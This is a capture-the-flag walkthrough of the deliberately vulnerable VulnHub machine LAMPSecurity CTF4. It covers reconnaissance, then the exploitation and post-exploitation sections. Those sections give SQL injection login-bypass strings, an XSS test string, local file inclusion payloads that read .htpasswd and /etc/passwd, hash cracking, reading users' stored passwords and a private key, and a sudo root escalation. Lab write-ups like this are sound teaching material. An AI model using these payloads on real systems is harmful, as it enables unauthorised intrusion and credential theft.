LAMPSecurity: CTF4

[Machine](https://www.vulnhub.com/entry/lampsecurity-ctf4,83/ "https://www.vulnhub.com/entry/lampsecurity-ctf4,83/")

## Reconnaissance

### nmap

* ssh
* smtp
* http
* ipp(closed)

### Vulnerable versions

* [ ] ssh

* [x] smtp - Sendmail 8.13.5 - Remote Signal Handling (PoC)

* [ ] http

### http

#### robots.txt

```
User-agent: *
Disallow: /mail/
Disallow: /restricted/
Disallow: /conf/
Disallow: /sql/
Disallow: /admin/
```

#### /mail/

* Log in form.

* SquirrelMail 1.4.17. 

#### /restricted/

* Server authentication window.

#### /conf/

* Internal Server Error.

#### /sql/

* File `db.sql` with queries.

#### /admin/

* Log in form.

#### /calendar/

* Real calendar.

* Log in button.

#### /pages/

* A three `.php` files.

#### /usage/

* Statistics.

* Webalizer version 2.01 - nothing.

#### /index.html?page=blog&title=Blog

* user: `jdurbin`

#### whatweb

* PHP 5.1.6
```
PHP 5.1.6 - 'Chunk_Split()' Integer Overflow                                                                                                                                                      
PHP 5.1.6 - 'Imap_Mail_Compose()' Remote Buffer Overflow                                                                                                                                               
PHP 5.1.6 - 'Msg_Receive()' Memory Allocation Integer Overflow       
PHP 5.1.6 - Mb_Parse_Str Function Register_Globals Activation
```

#### dirb
 
* http://192.168.88.222/mail/configure - some sh script.

* http://192.168.88.222/admin/inc/blog.php - form with SQL error disclosure.

* http://192.168.88.222/mail/contrib/decrypt_headers.php - form with key and string.

### smtp

#### smtp-commands nmap script

`nmap -p25 --script smtp-commands -oA commands 192.168.88.222` - gives nothing.

#### smtp-enum-users nmap script

`nmap --script smtp-enum-users 192.168.88.222` - gives the result that VRFY and EXPN methods are not working.

#### Grab banner

`nc -vn 192.168.88.222 25`. Then `HELO x` and it shows the domain `ctf4.sas.upenn.edu`.

## Thread modeling

1. Exploit: `Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion.`

2. Exploit: `Sendmail 8.13.5 - Remote Signal Handling (PoC)`

3. Try SQLi at `/admin/inc/blog.php`.

4. Examine /mail/contrib/decrypt_headers.php

5. Brute-force ssh with username jdurbin.

6. Try SQLi at login forms. 

## Vulnerability analysis

1. Local File Inclusion with `src/redirect.php?plugins[]=../../../../etc/passwd%00` doesn't work.

2. PoC exploit seems doesn't work too.

3. I couldn't exploit it, because there was escape \.

4. It just tries to encode string(?) with key(?).

5. Didn't give a result.

6. `' or 1=1` gives a SQL error with query exfiltration :) You need to do it with `Burp` cause JS code will delete all `'` symbols.

7. Also, in search panel and title, classic xss `<script>alert(1);</script>`.

You also have a squirrel login panel, but I think that it will not be vulnerable or more difficult to exploit than the login panel above.

## Exploitation

### login form SQLi

`' or 1=1` works. Mysql error:
```sql
select user_id from user where user_name='' or 1=1' AND user_pass = md5('' or 1=1')
```

admin: `' or 1='1
password: `') or 1=1#`
Final query will be next:
```
select user_id from user where user_name='' or 1='1' AND user_pass = md5('') or 1=1#')
```
And it will give the access. Your id cookie will be 6. But you will not get anything after that. :(

### Additional reconnaissance

I don't get a new opportunity to get access to the target. Need an additional enumeration.

Searching...

### LFI

With `http://ctf4.sas.upenn.edu/?page=../inc/footer` you will get a cup of footers.

Apache - .htaccess, .htpasswd.

Now, combine it: `?page=../restricted/.htpasswd%00`
`/restricted/` from robots.txt, `%00` for end file without `.php` extension, other way Apache will treat it as php file.

Then `john` will easily crack the hashes. `ssh sorzek@192.168.88.222 -o KexAlgorithms=diffie-hellman-group-exchange-sha1`. Got access to the target.

## Post exploitation

### Enumeration 

* sorzek - nothing.

* dstevens - nothing. But actually has information in the mail folder. Talk about passwords "password1234" and "undone".

### MySQL stored hashes

* pmoore - has access to MySQL with `mysql -u root -p` and password `database`. So, next, I did:

```sql
use ehks;
show tables;
select * from user;
```
And got all the md5 hashes. The next step is to crack them all. `john the reaper` didn't work...[crack hashes](https://crackstation.net/ "https://crackstation.net/"). 

### Access to .ssh folder of user achen

`cat /home/achen/.ssh/achen_priv.ppk` will show you private key from putty. Download `puttygen.exe` and use `wine`. Copy priv. key to your machine. But my `puttygen.exe` generated a bad key, I couldn't log in. So, I just used the previous way.

### Privilege Escalation

`ssh achen@192.168.88.222` with password `seventysixers`. Then `sudo -l` will show you that you can just `sudo su` and get root.
